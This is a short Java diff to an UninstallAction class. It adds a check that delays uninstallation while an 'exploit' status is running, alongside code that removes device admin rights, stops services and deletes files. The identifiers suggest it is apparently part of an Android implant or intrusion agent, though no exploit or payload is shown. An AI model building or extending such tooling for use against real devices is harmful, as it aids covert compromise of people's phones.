@@ -71,6 +71,12 @@ public class UninstallAction extends SubActionSlow {
 			Status.uninstall = true;
 			// check Core.taskInit
 			Core.self().createUninstallMarkup();
+			if(Status.getExploitStatus()==Status.EXPLOIT_STATUS_RUNNING) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualExecute), exploit still running...you have to wait");
+				}
+				return false;
+			}
 			removeAdmin(Status.getAppContext());
 			ret = stopServices();
 			ret &= removeFiles();
